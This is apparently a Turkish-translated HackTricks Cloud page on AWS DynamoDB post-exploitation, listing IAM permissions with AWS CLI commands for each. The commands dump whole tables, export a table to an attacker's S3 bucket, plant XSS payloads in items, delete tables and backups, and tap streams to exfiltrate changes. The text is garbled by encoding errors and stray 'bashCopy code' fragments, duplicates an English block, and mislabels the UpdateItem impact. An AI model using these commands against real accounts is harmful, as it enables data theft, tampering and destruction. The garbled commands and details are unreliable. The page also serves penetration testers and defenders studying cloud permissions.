# AWS - DynamoDB SonrasÄ± SÄ±zma

<details>

<summary><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'Ä± **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

## DynamoDB

Daha fazla bilgi iÃ§in kontrol edin:

{% content-ref url="../aws-services/aws-databases/aws-dynamodb-enum.md" %}
[aws-dynamodb-enum.md](../aws-services/aws-databases/aws-dynamodb-enum.md)
{% endcontent-ref %}

### `dynamodb:BatchGetItem`

Bu izinlere sahip bir saldÄ±rgan, **birincil anahtar kullanarak tablolardan Ã¶ÄŸeleri alabilecektir** (sadece tablonun tÃ¼m verilerini isteyemezsiniz). Bu, birincil anahtarlarÄ± bilmeniz gerektiÄŸi anlamÄ±na gelir (tablo meta verilerini alarak bunu elde edebilirsiniz (`describe-table`).

{% tabs %}
{% tab title="json dosyasÄ±" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="SatÄ±r iÃ§i" %}
{% code overflow="wrap" %}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{% endcode %}
{% endtab %}
{% endtabs %}



**Potansiyel Etki:** Tabloda hassas bilgileri bulmak suretiyle dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltme

### `dynamodb:GetItem`

**Ã–nceki izinlere benzer ÅŸekilde**, bu izin potansiyel bir saldÄ±rganÄ±n, alÄ±nacak giriÅŸin birincil anahtarÄ±nÄ± vererek sadece 1 tablodan deÄŸerleri okumasÄ±na olanak tanÄ±r:

{% code overflow="wrap" %}
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
{% endcode %}

Bu izinle birlikte **`transact-get-items`** yÃ¶ntemini de kullanmak mÃ¼mkÃ¼ndÃ¼r:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**Potansiyel Etki:** Hassas bilgilerin tabloda bulunarak dolaylÄ± bir ÅŸekilde ayrÄ±calÄ±k yÃ¼kseltilmesi

### `dynamodb:Query`

**Ã–nceki izinlere benzer ÅŸekilde**, bu izin potansiyel bir saldÄ±rganÄ±n, geri almak iÃ§in giriÅŸin birincil anahtarÄ±nÄ± vererek yalnÄ±zca 1 tablodan deÄŸerleri okumasÄ±na olanak tanÄ±r. [KarÅŸÄ±laÅŸtÄ±rmalarÄ±n bir alt kÃ¼mesine](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API\_Condition.html) izin verir, ancak birincil anahtarla yapÄ±lan tek izin verilen karÅŸÄ±laÅŸtÄ±rma "EQ" olduÄŸundan, bir istekte tÃ¼m veritabanÄ±nÄ± almak iÃ§in bir karÅŸÄ±laÅŸtÄ±rma kullanamazsÄ±nÄ±z.

{% tabs %}
{% tab title="json dosyasÄ±" %}
{% code overflow="wrap" %}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{% endcode %}
{% endtab %}

{% tab title="inline" %}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potansiyel Etki:** Tabloda hassas bilgileri bulmak suretiyle dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltme

### `dynamodb:Scan`

Bu izni kullanarak tablonun tamamÄ±nÄ± kolayca **dÃ¶kÃ¼mleyebilirsiniz**.
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**Potansiyel Etki:** Hassas bilgilerin tabloda bulunarak dolaylÄ± bir ÅŸekilde ayrÄ±calÄ±k yÃ¼kseltmesi yapÄ±labilir.

### `dynamodb:PartiQLSelect`

Bu izni kullanarak **tÃ¼m tabloyu kolayca dÃ¶kÃ¼mleyebilirsiniz**.
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
Bu izin ayrÄ±ca `batch-execute-statement` gibi iÅŸlemleri gerÃ§ekleÅŸtirmeye olanak saÄŸlar:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
Ancak bir deÄŸerle birincil anahtarÄ± belirtmeniz gerektiÄŸinden dolayÄ±, bu Ã§ok kullanÄ±ÅŸlÄ± deÄŸildir.

**Potansiyel Etki:** Tabloda hassas bilgileri bulmak suretiyle dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kseltme

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

Bu izin, bir saldÄ±rganÄ±n tabloyu kendi seÃ§tiÄŸi bir S3 kovasÄ±na **tamamen dÄ±ÅŸa aktarmasÄ±na** izin verecektir:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
Bu iÅŸin Ã§alÄ±ÅŸmasÄ± iÃ§in tablonun zaman iÃ§inde geri kazanÄ±m Ã¶zelliÄŸine sahip olmasÄ± gerekmektedir, tablonun bunu kontrol etmek iÃ§in kullanabilirsiniz:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
EÄŸer etkinleÅŸtirilmemiÅŸse, onu etkinleÅŸtirmeniz gerekecek ve bunun iÃ§in **`dynamodb:ExportTableToPointInTime`** iznine ihtiyacÄ±nÄ±z olacak:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**Potansiyel Etki:** Hassas bilgileri tabloda bulunarak dolaylÄ± bir ÅŸekilde ayrÄ±calÄ±k yÃ¼kseltme

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

Bu izinlerle, bir saldÄ±rgan **bir yedekten yeni bir tablo oluÅŸturabilir** (veya hatta bir yedek oluÅŸturup daha sonra farklÄ± bir tabloda geri yÃ¼kleyebilir). ArdÄ±ndan, gerekli izinlerle, Ã¼retim tablosunda **artÄ±k bulunmayan** yedeklerden bilgi kontrol edebilir.
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potansiyel Etki:** Tablo yedeklemesinde hassas bilgilerin bulunarak dolaylÄ± bir ayrÄ±calÄ±k yÃ¼kselmesi

### `dynamodb:PutItem`

Bu izin, kullanÄ±cÄ±larÄ±n tabloya yeni bir Ã¶ÄŸe eklemesine veya mevcut bir Ã¶ÄŸeyi yeni bir Ã¶ÄŸeyle deÄŸiÅŸtirmesine izin verir. AynÄ± birincil anahtara sahip bir Ã¶ÄŸe zaten varsa, **tÃ¼m Ã¶ÄŸe** yeni Ã¶ÄŸeyle deÄŸiÅŸtirilecektir. Birincil anahtar mevcut deÄŸilse, belirtilen birincil anahtara sahip yeni bir Ã¶ÄŸe **oluÅŸturulur**.

{% tabs %}
{% tab title="XSS Ã–rneÄŸi" %}
{% code overflow="wrap" %}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Turkish" %}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potansiyel Etki:** Bir DynamoDB tablosunda veri ekleyerek veya deÄŸiÅŸtirerek daha fazla zafiyet/bypassÄ±n sÃ¶mÃ¼rÃ¼lmesi

### `dynamodb:UpdateItem`

Bu izin, kullanÄ±cÄ±larÄ±n bir Ã¶ÄŸenin mevcut Ã¶zniteliklerini deÄŸiÅŸtirmesine veya bir Ã¶ÄŸeye yeni Ã¶znitelikler eklemesine olanak tanÄ±r. TÃ¼m Ã¶ÄŸeyi **deÄŸiÅŸtirmez**, yalnÄ±zca belirtilen Ã¶znitelikleri gÃ¼nceller. EÄŸer birincil anahtar tabloda mevcut deÄŸilse, iÅŸlem belirtilen birincil anahtara sahip yeni bir Ã¶ÄŸe oluÅŸturacak ve gÃ¼ncelleme ifadesinde belirtilen Ã¶znitelikleri ayarlayacaktÄ±r.
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{% endcode %}
{% endtab %}

{% tab title="Turkish" %}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{% endtab %}
{% endtabs %}

**Potansiyel Etki:** Bir saldÄ±rgan, bir DynamoDB tablosunu silebilir ve bÃ¶ylece veri kaybÄ±na neden olabilir.

### `dynamodb:DeleteTable`

Bu izne sahip bir saldÄ±rgan, bir DynamoDB tablosunu silebilir ve bÃ¶ylece veri kaybÄ±na neden olabilir.
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**Potansiyel etki**: Silinen tabloya dayanan hizmetlerin veri kaybÄ± ve kesintiye uÄŸramasÄ±.

### `dynamodb:DeleteBackup`

Bu izne sahip bir saldÄ±rgan, bir DynamoDB yedeklemesini silebilir ve bÃ¶ylece bir felaket kurtarma senaryosunda veri kaybÄ±na neden olabilir.
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**Potansiyel etki**: Veri kaybÄ± ve felaket kurtarma senaryosunda yedekten geri dÃ¶nme yeteneÄŸinin kaybedilmesi.

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

{% hint style="info" %}
TODO: Bu gerÃ§ekten Ã§alÄ±ÅŸÄ±yor mu diye test edin
{% endhint %}

Bu izinlere sahip bir saldÄ±rgan, **bir DynamoDB tablosunda bir akÄ±ÅŸÄ± etkinleÅŸtirebilir, tabloyu gÃ¼ncellemek iÃ§in akÄ±ÅŸÄ± baÅŸlatabilir ve ardÄ±ndan tablodaki deÄŸiÅŸiklikleri izlemek iÃ§in akÄ±ÅŸa eriÅŸebilir**. Bu, saldÄ±rganÄ±n veri deÄŸiÅŸikliklerini izlemesine ve potansiyel olarak veri sÄ±zÄ±ntÄ±sÄ±na yol aÃ§abilecek veri deÄŸiÅŸikliklerini dÄ±ÅŸarÄ±ya aktarmasÄ±na olanak tanÄ±r.

1. Bir DynamoDB tablosunda bir akÄ±ÅŸÄ± etkinleÅŸtirin:
```bash
bashCopy codeaws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. ARN ve diÄŸer ayrÄ±ntÄ±larÄ± elde etmek iÃ§in akÄ±ÅŸÄ± aÃ§Ä±klayÄ±n:

```plaintext
To obtain the ARN and other details of a stream, you can use the following steps:

1. List all the available streams in the DynamoDB service by using the `list-streams` command.

2. Identify the target stream from the list and note down its name.

3. Use the `describe-stream` command along with the stream name to get detailed information about the stream.

4. Look for the `StreamArn` field in the output, which represents the ARN (Amazon Resource Name) of the stream.

5. Note down any other relevant details provided in the output, such as the stream status, creation time, and encryption settings.

By following these steps, you can obtain the ARN and other important details of a stream in AWS DynamoDB.
```

```plaintext
Bir akÄ±ÅŸÄ±n ARN'sini ve diÄŸer ayrÄ±ntÄ±larÄ±nÄ± elde etmek iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± kullanabilirsiniz:

1. `list-streams` komutunu kullanarak DynamoDB hizmetindeki mevcut akÄ±ÅŸlarÄ± listele.

2. Listeden hedef akÄ±ÅŸÄ± belirleyin ve adÄ±nÄ± not alÄ±n.

3. AkÄ±ÅŸÄ±n ayrÄ±ntÄ±lÄ± bilgilerini almak iÃ§in akÄ±ÅŸ adÄ±yla birlikte `describe-stream` komutunu kullanÄ±n.

4. Ã‡Ä±ktÄ±da `StreamArn` alanÄ±nÄ± arayÄ±n, bu alan akÄ±ÅŸÄ±n ARN'sini (Amazon Kaynak AdÄ±) temsil eder.

5. Ã‡Ä±ktÄ±da saÄŸlanan diÄŸer ilgili ayrÄ±ntÄ±larÄ±, akÄ±ÅŸ durumu, oluÅŸturma zamanÄ± ve ÅŸifreleme ayarlarÄ± gibi not alÄ±n.

Bu adÄ±mlarÄ± takip ederek, AWS DynamoDB'deki bir akÄ±ÅŸÄ±n ARN'sini ve diÄŸer Ã¶nemli ayrÄ±ntÄ±larÄ±nÄ± elde edebilirsiniz.
```
```bash
bashCopy codeaws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. AkÄ±ÅŸ ARN'sini kullanarak parÃ§acÄ±k yineleyicisini alÄ±n:
```bash
bashCopy codeaws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. AkÄ±ÅŸtan veriye eriÅŸmek ve veriyi dÄ±ÅŸarÄ± Ã§Ä±karmak iÃ§in parÃ§acÄ±k iÅŸaretÃ§isini kullanÄ±n:
```bash
bashCopy codeaws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**Potansiyel etki**: DynamoDB tablosunun deÄŸiÅŸikliklerinin gerÃ§ek zamanlÄ± izlenmesi ve veri sÄ±zdÄ±rÄ±lmasÄ±.

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana dÃ¶nÃ¼ÅŸmek iÃ§in</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>'Ä± Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya bizi **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** paylaÅŸÄ±n.

</details>
